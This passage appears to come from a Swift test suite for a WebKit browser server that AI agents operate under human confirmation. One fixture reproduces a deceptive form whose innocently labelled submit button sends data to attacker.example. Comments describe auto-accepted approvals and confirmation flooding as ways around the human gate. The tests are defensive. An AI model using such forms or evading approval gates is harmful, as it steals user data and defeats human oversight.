          replacement.value = input.value;
          input.replaceWith(replacement);
        }, { once: true });
      </script>
      """,
      baseURL: URL(string: "https://example.test/profile"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let longFormValue = String(repeating: "WebKitUI ", count: 64) + "WebKitUI"
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string(longFormValue),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("fill-name-once"),
    ]
    var newlineArguments = arguments
    newlineArguments["value"] = .string("Kevin\nSubmit")
    newlineArguments["idempotency_key"] = .string("blocked-input-newline")
    let newline = try await toolCall(
      server, id: 2, name: "browser_act", arguments: newlineArguments)
    #expect(try object(newline["error"])["code"] == .int(-32602))

    var oversizedArguments = arguments
    oversizedArguments["value"] = .string(String(repeating: "A", count: 4_097))
    oversizedArguments["idempotency_key"] = .string("blocked-oversized-input")
    let oversized = try await toolCall(
      server, id: 3, name: "browser_act", arguments: oversizedArguments)
    #expect(try object(oversized["error"])["code"] == .int(-32602))

    let prepared = try await toolCall(server, id: 4, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server,
      id: 5,
      name: "browser_act",
      arguments: arguments,
      requestState: try string(required["requestState"]),
      action: "accept",
      confirm: true
    )

    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
    let after = try await runtime.observe()
    let input = after.elements.first { $0.tag.segments.first?.text == "input" }
    #expect(input?.elementID == "e2")
    #expect(input?.value?.segments.first?.text == longFormValue)
  }

  @Test("An exact fill stays indeterminate while the live field is invalid")
  func invalidFillIsNotVerified() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label for='description'>Short description</label>
      <input id='description' aria-invalid='false'>
      <script>
        document.getElementById('description').addEventListener('input', event => {
          event.currentTarget.setAttribute('aria-invalid', 'true');
        });
      </script>
      """,
      baseURL: URL(string: "https://play.google.com/console/form"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string("Present but rejected"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("invalid-fill-is-not-verified"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["indeterminate"] != nil)

    let after = try await runtime.observe()
    #expect(after.elements.first?.value?.segments.first?.text == "Present but rejected")
    #expect(after.elements.first?.validationState == .invalid)
  }

  @Test("Exact fill verification canonicalizes Unicode and textarea line endings")
  func normalizedTextareaFillIsVerified() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<label for='description'>Description</label><textarea id='description'></textarea>",
      baseURL: URL(string: "https://example.test/listing"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let value = "Cafe\u{301}\r\nSecond line"
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string(value),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("normalized-textarea-fill"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let after = try await runtime.observe()
    #expect(after.elements.first?.value?.segments.first?.text == "Café\nSecond line")
  }

  @Test("URL prefix postconditions verify an SPA route")
  func verifiedURLPrefix() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button onclick=\"history.pushState({},'', '/console/apps/42')\">Open</button>",
      baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("url-prefix-spa-route"),
      "postcondition": .object([
        "type": .string("url_prefix"),
        "value": .string("https://example.test/console/"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("A confirmed fill supports a long semantic contenteditable textbox")
  func verifiedContenteditableFill() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<div role='textbox' contenteditable='true' aria-label='Post body' style='width:400px;height:120px'>Draft</div>",
      baseURL: URL(string: "https://example.test/submit"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let value = String(repeating: "Long form paragraph. ", count: 40) + "Done."
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("fill"),
      "value": .string(value),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("fill-contenteditable-once"),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
    let after = try await runtime.observe()
    #expect(after.elements.first?.value?.segments.first?.text == value)
  }

  @Test("A native submit control requires submit and verifies its postcondition")
  func verifiedSubmit() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <form onsubmit="event.preventDefault(); const s=document.createElement('div');
        s.setAttribute('role','status'); s.textContent='Submitted once'; document.body.appendChild(s)">
        <button>Send</button>
      </form>
      """,
      baseURL: URL(string: "https://example.test/form"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("submit"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("submit-form-once"),
      "postcondition": .object([
        "type": .string("semantic_text_appears"), "value": .string("Submitted once"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server,
      id: 3,
      name: "browser_act",
      arguments: arguments,
      requestState: try string(required["requestState"]),
      action: "accept",
      confirm: true
    )

    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("Password fill and submit-as-click fail before confirmation")
  func formAuthoritySeparation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<form><input type='password' aria-label='Password'><button>Send</button></form>",
      baseURL: URL(string: "https://example.test/account"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let elements = try array(observation["elements"])
    let observationID = try string(observation["observationID"])

    let password = try await toolCall(
      server,
      id: 2,
      name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(observationID),
        "element_id": .string(try string(try object(elements[0])["elementID"])),
        "operation": .string("fill"),
        "value": .string("secret"),
        "approval_mode": .string("mcp"),
        "idempotency_key": .string("blocked-password"),
      ])
    #expect(try object(password["error"])["code"] == .int(-32602))

    let submitAsClick = try await toolCall(
      server,
      id: 3,
      name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(observationID),
        "element_id": .string(try string(try object(elements[1])["elementID"])),
        "operation": .string("click"),
        "approval_mode": .string("mcp"),
        "idempotency_key": .string("wrong-capability"),
        "postcondition": .object([
          "type": .string("url_equals"), "value": .string("https://example.test/done"),
        ]),
      ])
    #expect(try object(submitAsClick["error"])["code"] == .int(-32602))
  }

  @Test("A confirmed MCP click verifies newly appearing same-page semantic text")
  func semanticPostconditionActuation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label="Save" onclick="
        const status = document.createElement('div');
        status.setAttribute('role', 'status');
        status.textContent = 'Saved locally';
        document.body.appendChild(status);
      ">Save</button>
      """,
      baseURL: URL(string: "https://example.test/settings")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let element = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(element["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("semantic-save-once"),
      "postcondition": .object([
        "type": .string("semantic_text_appears"),
        "value": .string("Saved locally"),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: arguments)
    let requestState = try string(try object(prepared["result"])["requestState"])
    let accepted = try await call(
      server,
      id: 3,
      method: "tools/call",
      params: .object([
        "name": .string("browser_act"),
        "arguments": .object(arguments),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object([
            "action": .string("accept"),
            "content": .object(["confirm": .bool(true)]),
          ])
        ]),
      ]),
      modern: true
    )

    let result = try object(accepted["result"])
    #expect(result["resultType"] == .string("complete"))
    let structured = try object(result["structuredContent"])
    #expect(structured["verification"] != nil)
  }

  @Test("Page title partial postconditions are parsed and verified")
  func pageTitlePartialPostcondition() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <title>Edit Identifier</title>
      <button aria-label="Continue" onclick="document.title='Saved Identifier'">
        Continue
      </button>
      """,
      baseURL: URL(string: "https://example.test/identifiers/edit")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("title-change-once"),
      "postcondition": .object([
        "type": .string("title_contains"), "value": .string("Saved"),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("A route-changing click verifies against the fresh observed URL")
  func urlChangePostcondition() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let initialURL = "https://example.test/identifiers/list"
    runtime.webView.loadHTMLString(
      """
      <div role="button" aria-label="Halte com.lorislab.halte"
        onclick="history.pushState({}, '', '/identifiers/bundleId/edit/47992K4235')">
        Halte com.lorislab.halte
      </div>
      """,
      baseURL: URL(string: initialURL))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("route-change-once"),
      "postcondition": .object([
        "type": .string("url_changes_from"), "value": .string(initialURL),
      ]),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    let verification = try object(structured["verification"])
    #expect(verification["verified"] != nil)
    #expect(runtime.agentSafeCurrentURL()?.hasSuffix("/bundleId/edit/47992K4235") == true)
  }

  @Test("A same-document wizard step verifies from its fresh heading")
  func headingPostcondition() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <h1>Create a Provisioning Profile</h1>
      <button onclick="
        const heading = document.querySelector('h1');
        if (heading.textContent === 'Create a Provisioning Profile') {
          heading.textContent='Select Certificates'; this.textContent='Generate';
        } else { heading.textContent='Download'; }
      ">
        Continue
      </button>
      """,
      baseURL: URL(string: "https://example.test/account/resources/profiles/add"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try #require(try array(observation["elements"]).last)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(try object(target)["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("wizard-heading-once"),
      "postcondition": .object([
        "type": .string("heading_equals"), "value": .string("Select Certificates"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let refreshedCall = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let refreshed = try object(try object(refreshedCall["result"])["structuredContent"])
    let generate = try #require(try array(refreshed["elements"]).last)
    let generateArguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(refreshed["observationID"])),
      "element_id": .string(try string(try object(generate)["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("wizard-generate-heading-once"),
      "postcondition": .object([
        "type": .string("heading_equals"), "value": .string("Download"),
      ]),
    ]
    let generatePrepared = try await toolCall(
      server, id: 5, name: "browser_act", arguments: generateArguments)
    let generateRequired = try object(generatePrepared["result"])
    let generated = try await roundTripToolCall(
      server, id: 6, name: "browser_act", arguments: generateArguments,
      requestState: try string(generateRequired["requestState"]), action: "accept", confirm: true)
    let generatedStructured = try object(try object(generated["result"])["structuredContent"])
    #expect(try object(generatedStructured["verification"])["verified"] != nil)
  }

  @Test("A same-URL mutation explains an indeterminate URL postcondition")
  func sameURLMutationDiagnostic() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    let initialURL = "https://example.test/account/resources/profiles/add"
    runtime.webView.loadHTMLString(
      "<h1>Start</h1><button onclick=\"document.querySelector('h1').textContent='Profile Name'\">Continue</button>",
      baseURL: URL(string: initialURL))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try #require(try array(observation["elements"]).last)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(try object(target)["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("same-url-diagnostic-once"),
      "postcondition": .object([
        "type": .string("url_changes_from"), "value": .string(initialURL),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(structured["diagnostic"]?.stringValue == "same_url_page_state_changed")
    #expect(try array(structured["suggested_postconditions"]).contains(.string("heading_equals")))
  }

  @Test("A confirmed checkbox click verifies semantic checked state")
  func verifiedCheckedState() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <label style='display:inline-block; padding:8px'>
        <input style='position:absolute; opacity:0' type='checkbox'> View financial data
      </label>
      """,
      baseURL: URL(string: "https://example.test/permissions"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("check-financial-data-once"),
      "postcondition": .object([
        "type": .string("checked_equals"), "value": .string("true"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)
  }

  @Test("A Save action proves the Confirm dialog and exposes a no-replay modal hint")
  func saveThenConfirmDialog() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label="Save" onclick="
        this.dataset.dispatchCount = String(Number(this.dataset.dispatchCount || '0') + 1);
        const dialog = document.createElement('div');
        dialog.setAttribute('role', 'dialog');
        dialog.setAttribute('aria-label', 'Confirm');
        dialog.innerHTML = '<button>Confirm</button>';
        document.body.appendChild(dialog);
      ">Save</button>
      """,
      baseURL: URL(string: "https://example.test/identifiers/edit")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("save-before-confirm-once"),
      "postcondition": .object([
        "type": .string("dialog_appears"), "value": .string("Confirm"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let after = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let afterObservation = try object(try object(after["result"])["structuredContent"])
    let modal = try object(afterObservation["modal_state"])
    #expect(modal["active"] == .bool(true))
    #expect(try string(modal["safe_next_step"]).contains("never replay"))
    let dispatchCount =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('button').dataset.dispatchCount") as? String
    #expect(dispatchCount == "1")
  }

  @Test("A modern client that names no approval mode still gets the native dialog")
  func modernActDefaultsToNativeConfirmation() async throws {
    // browser_act defaulted to MCP elicitation for a modern client while
    // browser_navigate defaulted to native, so the product's own sentence — human
    // confirmation before every exposed click — was false for the ordinary case. It
    // matters because elicitation carries no guarantee a human answered it: the
    // specification only says clients SHOULD offer approval controls, the TypeScript
    // SDK fulfils the request from a callback, and at least one shipping client
    // auto-accepts it outright. The gate cannot live on a channel the client may fill
    // in by itself.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label='Create app'
        onclick="this.dataset.state=event.isTrusted ? 'trusted' : 'rejected'">Create app</button>
      """,
      baseURL: URL(string: "https://example.test/apps"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)

    let acted = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "idempotency_key": .string("default-mode-once"),
        "postcondition": .object([
          "type": .string("attribute_equals"), "attribute": .string("data-state"),
          "value": .string("trusted"),
        ]),
      ])

    let structured = try object(try object(acted["result"])["structuredContent"])
    #expect(structured["confirmation_mode"] == .string("native"))
    #expect(presenter.requests.count == 1, "the native dialog was never asked for")
  }

  @Test("A control whose formaction leaves the page says so in the confirmation")
  func foreignSubmissionDestinationIsConfirmed() async throws {
    // The published attack: attacker-authored region, a submit control whose accessible
    // name reads like the task the operator asked for and whose formaction points
    // elsewhere. Every other field in the receipt reports success honestly, so the
    // dialog is the only place this can be caught.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <form action="/track">
        <button type="submit" aria-label="Show tracking number"
          formaction="https://attacker.example/collect">Show tracking number</button>
      </form>
      """,
      baseURL: URL(string: "https://shop.example/orders/1471"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)

    _ = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        // The server refuses operation=click on a form submit control and directs the
        // caller to submit, so the attack is exercised through the operation it is
        // actually reachable by.
        "operation": .string("submit"),
        "idempotency_key": .string("foreign-destination-once"),
        "postcondition": .object([
          "type": .string("url_contains"), "value": .string("/track"),
        ]),
      ])

    let shown = try #require(presenter.requests.first?.message)
    #expect(shown.contains("attacker.example"), "the dialog never named the destination")
    #expect(shown.contains("A DIFFERENT SITE"))
    #expect(shown.contains("shop.example"), "the dialog must name the page for comparison")
  }

  @Test("A flood of confirmations is refused instead of shown")
  func confirmationFloodIsRefused() async throws {
    // Twenty dialogs in a minute is not a workflow; it is an attempt to make the human
    // stop reading. The refusal names the count so the agent is told why.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button>Save</button>", baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    var lastError: JSONValue?
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      let observed = try await toolCall(
        server, id: Int64(1000 + index * 2), name: "browser_observe",
        arguments: ["session_id": .string(handle.rawValue.uuidString)])
      let observation = try object(try object(observed["result"])["structuredContent"])
      let target = try object(try array(observation["elements"]).first)
      let acted = try await toolCall(
        server, id: Int64(1001 + index * 2), name: "browser_act",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "observation_id": .string(try string(observation["observationID"])),
          "element_id": .string(try string(target["elementID"])),
          "operation": .string("click"),
          "idempotency_key": .string("flood-\(index)"),
          "postcondition": .object([
            "type": .string("url_equals"), "value": .string("https://example.test/done"),
          ]),
        ])
      lastError = acted["error"]
    }

    let error = try object(lastError)
    #expect(try string(error["message"]).contains("in the last minute"))
    #expect(
      presenter.requests.count <= ConfirmationRatePolicy.refuseThreshold,
      "the flood was presented to the operator instead of refused")
  }

  @Test("A burst names which request it is without displacing the exact requested action")
  func confirmationBurstIsNamedInTheDialog() async throws {
    // The count is the one fact that makes a flood legible. It is appended, because the
    // first thing the operator reads must remain the exact action being asked for.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.burstThreshold))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    for index in 0..<ConfirmationRatePolicy.burstThreshold {
      _ = try await toolCall(
        server, id: Int64(6000 + index), name: "browser_navigate",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "url": .string("https://example.test/burst/\(index)"),
        ])
    }
    #expect(presenter.requests.count == ConfirmationRatePolicy.burstThreshold)
    let quiet = try #require(presenter.requests.first?.message)
    #expect(!quiet.contains("Confirmations asked for in the last minute:"))
    let burst = try #require(presenter.requests.last?.message)
    #expect(burst.hasPrefix("Requested action:"), "the burst line displaced the exact action")
    let expectedTail =
      "\n\nConfirmations asked for in the last minute:\n"
